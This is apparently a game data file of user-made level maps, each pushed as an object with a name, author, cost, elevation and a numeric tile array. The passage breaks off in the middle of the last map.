maps.push({name="pringle",author="MoistNoodlez",id="#1658071935",direction="forward",cost=264,elevation=0,map=[0,0,0,0,0,0,0,0,0,5,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,0,0,0,0,5,5,0,0,0,0,5,91,91,91,5,0,0,5,91,5,0,0,0,0,0,5,5,0,0,0,5,91,91,5,0,0,0,0,5,91,5,5,0,0,0,0,5,0,0,0,5,91,5,5,5,5,0,0,5,91,91,5,0,0,0,0,5,0,0,0,0,5,0,5,0,5,0,0,5,91,5,5,5,0,0,0,5,0,0,0,0,5,0,0,5,0,0,5,91,5,91,91,5,5,5,5,5,0,0,0,0,5,0,0,0,0,0,5,91,5,91,5,5,76,76,5,0,0,0,0,5,5,0,0,0,0,0,5,91,5,91,5,5,5,76,76,5,0,0,5,91,0,0,0,0,0,0,5,5,5,5,5,0,5,76,76,5,0,5,91,91,0,5,5,5,0,5,91,5,91,5,0,0,5,76,76,5,0,5,91,91,0,5,0,5,0,5,91,5,91,5,0,0,5,76,5,0,0,5,91,91,5,0,5,0,0,5,91,5,5,0,0,5,5,5,0,0,0,0,5,5,5,0,0,0,5,91,91,5,0,0,5,5,76,5,0,0,0,0,0,5,5,0,0,5,5,5,5,5,0,5,76,76,76,5,0,0,0,0,0,5,5,0,0,5,5,0,0,0,5,5,5,76,76,5,0,0,0,0,0,0,0,5,5,5,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,2,2,0,0,0,0,0,0,0]});
maps.push({name="shroomdick",author="MoistNoodlez",id="#1658073404",direction="right",cost=293,elevation=9,map=[0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,92,92,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,122,122,122,5,5,0,0,0,0,0,5,5,5,5,0,0,0,5,5,76,76,122,122,122,5,0,0,0,0,5,119,119,119,5,0,0,5,5,121,121,121,121,0,122,92,0,0,0,0,5,0,119,119,119,0,5,5,120,120,120,120,121,122,122,92,0,0,0,0,5,76,119,76,119,5,5,119,119,0,119,76,121,76,122,5,5,5,5,5,5,5,76,119,0,5,118,118,118,118,119,120,0,122,122,5,18,20,0,0,0,5,5,119,5,5,117,117,117,118,119,120,121,122,122,5,18,20,0,0,0,0,5,96,96,5,116,97,117,76,119,120,76,122,122,5,18,0,0,0,0,0,0,96,2,5,116,116,117,118,119,120,121,122,122,5,18,20,0,0,0,0,0,96,2,5,5,117,0,118,119,120,121,122,122,5,18,20,0,0,0,0,5,96,96,0,5,118,118,118,76,120,121,76,122,5,5,5,5,5,5,5,119,119,5,0,5,5,119,119,119,120,0,122,122,92,0,0,0,0,5,119,76,76,119,0,0,5,120,120,0,120,121,122,122,92,0,0,0,0,5,119,0,119,119,0,0,5,5,5,121,121,76,122,5,5,0,0,0,0,5,119,76,119,0,0,0,0,0,5,5,122,122,122,5,0,0,0,0,0,5,5,119,119,5,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="boo",author="MoistNoodlez",id="#1658075278",direction="forward",cost=174,elevation=0,map=[0,0,0,0,0,5,5,5,5,2,2,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,0,0,6,6,6,0,0,0,0,5,0,0,0,0,5,5,0,0,0,0,0,6,76,76,76,6,6,0,0,5,5,0,0,0,5,0,0,5,5,5,0,0,6,76,76,76,76,6,0,0,5,5,0,0,5,0,0,0,0,0,0,6,76,76,94,76,6,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0,6,76,94,76,76,6,0,0,0,5,0,0,5,0,0,5,5,5,0,6,76,76,76,76,6,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0,6,6,76,76,76,6,0,0,0,5,0,0,5,0,0,0,0,0,0,0,0,0,6,6,6,0,0,0,0,5,5,0,5,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,5,5,0,5,5,0,0,0,0,5,5,0,0,5,0,0,0,0,0,0,5,0,0,0,5,5,0,0,0,5,0,0,0,5,0,0,0,0,0,0,5,0,0,0,0,5,0,0,0,5,5,0,0,5,0,0,0,0,0,5,5,0,0,0,0,5,5,0,0,0,5,5,5,0,0,0,0,0,0,5,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,5,5,0,0,0,0,0,0,0]});
maps.push({name="adidas",author="MoistNoodlez",id="#1658075771",direction="forward",cost=401,elevation=0,map=[0,5,5,2,2,5,5,5,5,5,5,5,76,76,76,76,0,76,0,0,0,5,5,5,76,5,76,5,76,76,5,5,5,76,76,76,0,76,0,0,0,5,5,76,76,76,76,5,5,76,76,5,5,76,76,76,0,76,0,0,5,5,76,76,5,76,76,5,5,5,76,76,5,5,5,76,0,76,0,0,5,5,76,76,5,76,76,5,5,5,5,76,76,5,5,5,0,76,0,0,5,5,76,5,76,76,76,5,5,5,5,5,76,76,5,5,0,76,0,0,76,5,76,76,76,76,5,5,5,5,5,5,76,76,5,5,0,76,0,0,0,76,5,5,5,5,5,5,5,76,5,5,76,76,5,5,0,76,0,0,0,0,0,0,0,0,0,76,5,5,76,76,76,76,5,5,0,76,0,0,0,0,0,0,0,0,0,5,5,5,5,76,76,5,5,5,0,76,0,0,0,0,0,0,0,0,0,0,76,5,5,5,5,5,5,5,0,76,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,76,0,0,0,0,0,0,0,0,0,0,0,76,5,5,5,5,5,5,0,76,0,0,0,0,0,0,0,0,0,0,0,5,5,5,76,76,5,5,0,76,0,0,0,0,0,0,0,0,0,0,0,0,76,76,76,76,5,5,0,76,0,0,0,0,0,0,0,0,0,0,0,0,76,76,76,76,5,5,0,76,0,0,0,0,0,0,0,0,0,0,0,0,0,76,76,5,5,5,0,76,0,0,0,0,0,0,0,0,0,0,0,0,0,76,5,5,5,0,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,76,0,0,0,0]});
maps.push({name="nut",author="MoistNoodlez",id="#1658111361",direction="forward",cost=383,elevation=-1,map=[0,0,0,0,0,0,0,0,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,46,46,46,46,5,5,5,0,0,0,0,0,0,0,0,5,5,46,46,46,46,46,91,46,46,46,5,5,0,0,0,0,0,0,5,5,46,46,91,46,46,46,46,47,46,91,46,91,0,0,0,0,0,5,5,46,46,5,46,46,91,47,47,47,91,46,91,5,5,0,0,0,0,91,46,46,46,5,46,46,47,47,91,47,47,48,46,46,5,5,0,0,0,5,46,91,46,5,46,47,91,47,47,47,48,48,49,5,46,5,5,0,5,5,46,46,46,5,47,91,47,91,47,91,47,5,5,47,46,46,5,0,5,46,46,46,91,47,5,47,91,47,47,48,47,5,49,48,47,46,91,0,91,46,46,46,46,46,47,47,47,91,48,47,5,91,48,48,91,46,5,5,5,91,46,91,47,91,91,47,5,47,48,5,5,47,48,91,47,47,46,5,5,5,46,47,47,91,47,5,5,48,47,5,47,48,91,48,91,91,46,5,5,5,47,47,91,47,91,48,47,5,5,49,48,48,48,91,48,47,46,5,0,91,47,47,47,47,91,47,5,48,90,48,47,90,48,48,47,46,5,5,0,5,91,91,91,91,91,5,91,91,91,91,5,91,91,91,47,5,5,0,0,0,5,47,47,47,5,49,90,90,49,90,5,5,5,91,91,91,0,0,0,0,5,91,91,5,49,90,90,49,90,49,91,49,5,91,91,0,0,0,0,0,0,5,5,49,49,49,49,49,49,49,49,49,91,5,5,0,0,0,0,0,0,0,0,5,91,91,91,91,91,91,91,91,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,2,2,5,5,0,0,0,0,0,0]});
maps.push({name="kiddiepools",author="MoistNoodlez",id="#1658182476",direction="forward",cost=458,elevation=0,map=[0,0,0,0,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,0,0,0,0,1,24,90,64,64,64,64,90,24,24,24,24,24,24,24,1,0,0,0,0,1,24,90,24,24,24,24,90,24,24,24,24,24,24,24,1,0,0,0,0,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,0,0,0,0,1,90,24,24,24,24,24,24,24,24,24,24,24,24,24,1,0,0,0,0,1,64,65,65,65,127,65,65,65,90,24,24,24,24,90,1,0,0,0,0,1,64,65,65,65,127,65,65,65,24,24,24,24,24,64,1,0,0,0,0,1,64,65,65,65,127,65,65,65,24,24,24,24,24,64,1,0,0,0,0,1,90,65,65,65,65,65,65,65,24,24,24,24,24,64,1,0,0,0,0,1,64,65,65,65,65,65,65,65,90,24,24,90,24,90,1,0,0,0,0,1,64,65,65,65,93,65,65,65,24,24,24,24,24,64,1,0,0,0,0,1,64,65,65,65,65,65,65,65,24,24,24,24,24,64,1,0,0,0,0,1,90,65,65,65,65,65,65,65,24,24,24,24,24,64,1,0,0,0,0,1,64,65,65,65,65,65,65,65,24,75,75,75,75,90,1,0,0,0,0,1,64,65,65,65,65,65,65,65,24,75,75,75,75,64,1,0,0,0,0,1,64,65,65,65,65,65,65,65,24,75,75,94,75,64,1,0,0,0,0,1,90,65,65,65,65,65,65,65,24,75,75,75,75,90,1,0,0,0,0,1,24,24,24,24,24,24,24,24,24,24,24,97,24,24,1,0,0,0,0,1,1,96,96,64,64,64,90,24,24,24,24,24,24,90,1,0,0,0,0,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="bigboypools",author="MoistNoodlez",id="#1658183219",direction="forward",cost=504,elevation=0,map=[0,0,0,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,0,0,0,1,64,64,90,64,64,64,64,90,24,24,24,24,24,24,24,1,0,0,0,1,64,24,90,24,24,24,24,90,24,24,24,24,24,24,24,1,0,0,0,1,64,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,0,0,0,1,90,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,0,0,0,1,64,66,66,66,127,66,66,66,65,65,65,24,24,24,90,1,0,0,0,1,64,66,66,66,127,66,66,66,65,65,65,24,24,24,64,1,0,0,0,1,64,66,66,66,127,66,66,66,65,65,65,24,24,24,64,1,0,0,0,1,64,66,66,66,66,66,66,66,24,24,24,24,24,24,64,1,0,0,0,1,90,66,66,66,66,66,66,66,24,24,24,24,24,24,90,1,0,0,0,1,64,66,66,66,97,66,66,66,24,24,24,24,24,24,64,1,0,0,0,1,64,66,66,66,66,66,66,66,24,24,24,24,24,24,64,1,0,0,0,1,64,66,66,66,66,66,66,66,24,76,76,76,76,76,90,1,0,0,0,1,64,66,66,66,66,66,66,66,24,76,76,76,76,76,64,1,0,0,0,1,90,66,66,66,66,66,66,66,24,76,76,94,76,76,90,1,0,0,0,1,64,66,66,66,66,66,66,66,24,76,76,76,76,76,64,1,0,0,0,1,64,66,66,66,66,66,66,66,24,76,76,76,76,76,90,1,0,0,0,1,90,24,24,24,24,24,24,24,24,24,24,24,97,24,64,1,0,0,0,1,64,64,96,96,64,64,64,90,64,64,64,64,64,64,90,1,0,0,0,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="airparkour",author="MoistNoodlez",id="#1658184407",direction="forward",cost=246,elevation=-1,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,131,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,139,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,131,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,139,14,13,15,1,0,97,0,0,0,0,97,0,0,0,0,0,0,0,1,1,1,12,16,1,0,132,0,0,0,0,132,0,0,0,0,97,132,0,0,0,1,11,17,1,0,19,0,0,0,0,9,0,0,0,0,22,22,0,0,0,1,10,18,1,0,19,0,0,0,0,9,0,0,0,0,4,4,0,0,0,1,9,19,1,0,135,0,0,0,0,130,0,0,0,0,14,14,0,0,0,1,8,20,1,0,135,0,0,0,0,130,0,0,0,0,133,133,0,0,0,1,7,19,1,0,135,0,0,0,0,130,0,0,0,0,133,133,0,0,0,1,7,18,1,0,135,0,0,0,0,130,0,0,0,0,133,133,0,0,0,1,8,17,1,0,135,0,0,0,0,130,0,0,0,0,133,133,0,0,0,1,9,16,1,0,0,0,0,0,0,0,0,0,0,0,133,133,0,0,0,1,10,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,14,1,3,3,3,3,3,3,3,3,3,3,3,0,0,3,3,3,1,13,14,1,14,14,14,14,14,14,14,14,14,14,14,135,135,14,14,14,96,96,96,1,138,14,14,14,14,14,14,14,14,14,14,135,135,14,14,14,96,2,2,1]});
maps.push({name="waterparkour",author="MoistNoodlez",id="#1658185490",direction="forward",cost=445,elevation=-1,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,131,14,14,14,1,0,0,97,132,0,0,0,0,0,0,0,0,0,0,1,139,14,14,14,1,0,0,127,127,0,0,0,14,14,97,132,14,14,0,1,131,14,14,14,1,0,0,22,22,0,0,0,14,14,14,14,14,14,0,1,139,14,13,15,1,0,0,66,66,0,0,0,14,14,14,14,14,14,0,1,1,1,12,16,1,0,0,66,66,0,0,0,14,14,14,14,14,14,0,0,0,1,11,17,1,0,0,66,66,0,0,74,74,74,74,14,14,14,0,0,0,1,10,18,1,0,0,66,66,0,0,74,74,74,74,72,72,72,72,0,0,1,9,19,1,0,0,66,66,0,0,74,74,74,74,72,72,72,72,0,0,1,8,20,1,0,0,66,66,0,0,74,74,14,74,72,14,72,72,0,0,1,7,19,1,0,0,66,66,0,0,74,74,74,74,72,72,72,72,0,0,1,7,18,1,0,0,66,66,0,0,71,71,71,71,73,73,73,73,0,0,1,8,17,1,0,0,0,0,0,0,71,71,14,71,73,14,73,73,0,0,1,9,16,1,0,0,0,0,0,0,71,71,71,71,73,73,73,73,0,0,1,10,15,1,0,0,0,0,0,0,71,71,71,71,73,73,73,73,0,0,1,11,14,1,0,0,0,0,0,0,14,14,14,14,14,73,73,73,0,0,1,12,14,1,3,3,3,3,3,3,14,14,14,14,14,14,14,14,14,14,1,13,14,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,96,96,96,1,138,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,96,2,2,1]});
maps.push({name="MoistDown",author="MoistNoodlez",id="#1658189687",direction="forward",cost=596,elevation=-10,map=[1,94,24,24,24,24,24,24,24,2,2,24,24,24,24,24,24,24,94,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,47,47,47,47,47,47,47,47,47,47,47,47,47,47,47,47,47,47,1,1,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,1,1,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,1,1,3,3,0,3,3,0,3,3,0,0,3,3,0,3,3,0,3,3,1,1,24,24,24,24,24,24,24,24,96,96,24,24,24,24,24,24,24,24,1,1,97,24,24,24,24,24,24,96,2,2,96,24,24,24,24,24,24,97,1]});
maps.push({name="Ramp It Up",author="Niikos",id="#1658189812",direction="right",cost=258,elevation=19,map=[56,56,56,56,56,56,0,0,0,2,2,0,0,0,0,0,0,0,0,0,56,56,56,56,56,56,0,0,0,25,25,0,0,0,0,0,0,0,0,0,56,56,56,56,56,56,0,0,0,45,45,45,45,45,45,45,45,45,45,45,56,56,1,0,56,56,0,0,0,45,45,45,45,45,45,45,45,45,45,45,56,56,1,0,56,56,0,0,0,45,45,45,45,45,45,45,45,45,45,45,56,56,1,0,56,56,0,0,0,0,0,31,31,0,0,0,0,45,45,45,56,56,1,0,56,56,0,0,0,0,0,30,30,0,0,0,0,45,45,45,56,56,1,0,56,56,0,0,0,0,0,29,29,0,0,0,0,45,45,45,56,56,1,0,56,56,0,0,0,0,0,28,28,0,0,0,0,45,45,45,57,57,1,0,56,56,0,0,0,0,0,27,27,0,0,0,0,45,45,45,58,58,1,0,56,56,36,35,34,33,33,47,46,45,45,45,45,45,45,45,59,59,1,0,56,56,36,35,34,33,33,47,46,45,45,45,45,45,45,45,60,60,1,0,56,56,36,35,34,33,33,47,46,45,45,45,45,45,45,45,61,61,1,0,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,62,62,62,62,62,62,62,0,0,0,0,0,0,0,0,0,0,0,0,0,62,62,62,62,62,62,62,0,0,0,0,0,0,0,0,0,0,0,0,0,62,62,62,62,62,62,62,0,0,0,0,0,0,0,0,0,0,0,0,0,62,62,62,62,62,62,62,61,60,59,58,24,24,24,24,24,24,24,24,2,62,62,62,62,62,62,62,61,60,59,58,24,24,24,24,24,24,24,24,2,62,62,62,62,62,62,62,61,60,59,58,24,24,24,24,24,24,24,24,24]});
maps.push({name="Water World",author="fantasy",id="#1658191485",direction="forward",cost=784,elevation=0,map});
maps.push({name="Defend the shortcut2",author="fantasy",id="#1658192358",direction="left",cost=214,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,24,0,5,5,5,135,135,135,0,0,0,0,0,0,0,0,128,24,0,0,24,0,5,5,5,135,135,135,0,0,0,0,0,0,0,0,24,24,0,0,24,0,5,5,5,135,135,135,0,0,0,0,0,0,0,0,128,24,0,0,24,0,5,5,5,135,135,135,0,0,0,0,0,0,0,0,24,24,0,0,24,0,5,5,5,135,135,135,0,0,0,0,0,0,0,0,128,24,0,0,24,0,5,5,5,135,135,135,0,0,0,0,0,0,0,0,24,24,0,0,24,0,5,5,5,135,135,135,0,0,0,0,0,0,0,0,128,24,0,0,24,0,5,5,5,135,135,135,0,0,0,0,0,0,0,0,24,24,0,0,24,0,5,5,5,135,135,135,0,0,0,0,0,0,0,0,128,24,0,2,24,3,5,5,5,135,135,135,0,0,0,0,0,0,0,0,24,24,0,2,24,3,5,5,5,135,135,135,0,0,0,0,0,0,0,0,128,24,0,0,0,0,5,5,5,135,135,135,0,0,0,0,0,0,0,0,24,24,0]});
maps.push({name="Boost n Strafe",author="fantasy",id="#1658192602",direction="left",cost=661,elevation=-19,map=[100,5,135,135,135,135,135,135,135,5,5,135,135,135,135,135,135,0,2,2,5,5,135,135,135,135,135,135,135,5,5,135,135,135,135,135,135,0,24,24,0,5,135,135,135,135,135,135,135,135,135,135,135,135,135,5,135,0,128,24,0,5,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,0,24,24,0,5,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,0,128,24,0,5,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,0,24,24,0,5,135,135,135,135,5,5,135,135,135,135,135,135,135,135,135,0,128,24,0,5,135,135,135,135,5,5,135,135,135,135,135,135,135,135,135,0,24,24,0,5,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,0,128,24,0,5,135,135,135,135,135,135,135,5,5,135,135,135,135,135,135,0,24,24,0,5,135,135,135,135,135,135,135,5,5,135,135,135,135,135,135,0,128,24,0,5,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,0,24,24,0,5,135,135,135,135,5,5,135,135,135,135,135,135,135,135,135,0,128,24,0,5,135,135,135,135,5,5,135,135,135,135,135,135,135,135,135,0,24,24,0,5,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,0,128,24,0,5,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,0,24,24,0,5,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,0,128,24,2,5,135,135,135,135,135,135,135,135,135,135,135,135,135,5,135,0,24,24,2,5,135,135,135,135,135,135,135,5,5,135,135,135,135,135,135,0,128,24,0,5,135,135,135,135,135,135,135,5,5,135,135,135,135,135,135,0,24,24]});
maps.push({name="Noobs go ladder",author="fantasy",id="#1658192925",direction="right",cost=265,elevation=19,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,5,5,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,24,2,5,5,0,0,0,0,14,0,0,0,0,0,19,0,0,0,0,0,24,24,5,5,0,0,0,0,14,0,0,0,0,0,19,0,0,0,0,0,0,24,5,5,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,5,5,0,0,0,0,14,0,0,0,0,0,19,0,0,0,0,0,0,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,5,5,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,3,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,5,5,0,0,0,0,14,0,0,0,0,0,19,0,0,0,0,0,0,19,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,5,5,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,19,5,5,0,0,0,0,14,0,0,0,0,0,19,0,0,0,0,0,0,19,5,5,0,0,0,0,14,0,0,0,0,0,19,0,0,0,0,0,0,19,5,5,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,19,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,3,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14]});
maps.push({name="Chill area",author="fantasy",id="#1658193431",direction="forward",cost=261,elevation=0,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,77,0,0,0,0,0,67,0,0,77,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,77,24,77,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,77,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,0,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,67,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,67,24,67,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,67,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,0,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,77,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,77,24,77,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,77,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,0,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,67,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,67,24,67,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,67,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,0,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,77,0,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,77,24,77,0,0,5,5,0,0,0,0,77,12,0,0,0,0,67,24,0,0,77,0,0,0,2,2,0,0,0,0,0,77,0,0,0,0,0,67]});
maps.push({name="Spiral zone",author="fantasy",id="#1658193887",direction="forward",cost=147,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,21,20,20,20,20,19,19,19,0,0,0,0,0,0,5,5,0,0,0,21,21,0,0,0,0,0,0,19,18,0,0,0,0,0,5,5,0,0,21,21,0,0,0,0,0,0,0,0,18,17,0,0,0,0,5,5,0,21,21,0,0,0,0,24,0,0,0,0,0,17,0,0,0,0,5,5,0,21,0,0,0,24,24,0,24,24,0,0,0,17,17,0,0,0,5,5,0,22,0,0,24,24,0,0,0,24,24,0,0,0,16,0,0,0,5,5,0,22,0,0,24,0,0,0,0,0,24,24,0,0,16,15,0,0,5,5,0,22,0,0,24,0,24,131,0,0,0,24,0,0,0,15,0,0,5,5,0,22,0,0,24,0,24,24,0,0,0,24,0,0,0,14,0,0,5,5,0,23,0,0,24,24,24,24,0,0,24,24,0,0,13,14,0,0,5,5,0,23,0,0,0,0,0,0,0,0,24,0,0,0,13,0,0,0,5,5,0,23,0,0,0,0,0,0,0,24,24,0,0,0,12,0,0,0,5,5,0,23,23,0,0,0,0,24,24,24,0,0,0,0,12,0,0,0,5,5,0,0,23,24,24,24,24,24,0,0,0,0,0,11,12,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,10,10,11,11,0,0,0,0,5,5,6,6,0,0,0,0,8,9,9,9,10,0,0,0,1,1,1,0,0,0,0,6,7,7,7,8,8,0,0,0,0,0,0,0,1,132,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2]});
maps.push({name="Go and trigger",author="fantasy",id="#1658195105",direction="right",cost=277,elevation=0,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,0,0,0,0,0,0,0,45,45,45,45,45,45,0,0,0,0,0,45,45,0,0,0,0,0,0,0,45,45,45,45,133,45,0,45,45,45,45,45,45,0,0,0,0,0,0,0,45,45,45,45,45,45,0,45,131,45,134,45,45,0,0,0,0,0,0,0,45,132,45,45,45,45,0,45,45,45,45,45,45,0,0,0,0,0,0,0,45,45,45,45,94,45,0,45,45,45,45,45,45,0,0,0,0,0,0,0,45,45,45,45,45,45,0,45,45,45,45,45,45,25,25,25,25,25,25,25,45,45,45,45,45,45,0,45,45,45,45,45,45,0,0,0,0,0,0,0,45,45,45,94,45,45,0,45,93,45,45,45,45,0,0,67,67,67,0,0,45,45,45,45,45,45,0,45,45,45,45,45,45,0,67,24,24,24,67,0,45,45,45,45,45,45,0,45,45,45,45,45,45,0,67,24,24,24,67,0,45,45,45,45,45,45,0,45,45,45,45,45,45,0,0,67,67,67,0,0,45,45,45,45,45,45,0,45,45,45,45,45,45,0,0,0,0,0,0,0,45,45,45,100,45,45,0,45,45,45,45,45,45,25,25,25,25,25,25,25,45,45,45,45,45,45,0,45,45,45,45,45,45,0,0,0,0,0,0,0,45,45,45,45,45,45,0,45,45,93,45,45,45,0,0,0,0,0,0,0,45,45,45,45,45,45,0,45,45,45,45,45,45,0,0,0,0,0,0,0,45,45,45,45,45,45,2,100,45,45,45,45,45,25,25,25,25,25,25,25,45,45,45,45,45,45,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="No Swim Zone",author="Niikos",id="#1658198683",direction="forward",cost=974,elevation=11,map=[30,97,30,70,70,70,70,70,70,2,2,70,70,70,70,70,70,30,99,30,30,30,30,70,70,70,70,70,70,25,25,70,70,70,70,70,70,30,30,30,30,30,30,70,70,70,70,70,70,25,25,70,70,70,70,70,70,30,30,30,30,30,30,70,70,70,70,70,70,25,25,70,70,70,70,70,70,30,30,30,30,30,30,31,30,29,28,27,26,25,25,26,27,28,29,30,31,30,30,30,30,30,30,70,70,70,70,70,70,70,70,70,70,70,70,70,70,30,30,30,30,30,30,70,70,70,70,70,70,70,70,70,70,70,70,70,70,30,30,30,30,30,30,70,70,70,70,70,70,70,70,70,70,70,70,70,70,30,30,30,30,30,30,70,70,70,70,70,70,70,70,70,70,70,70,70,70,30,30,30,30,30,30,70,70,70,70,70,70,70,70,70,70,70,70,70,70,30,30,30,98,98,98,70,70,70,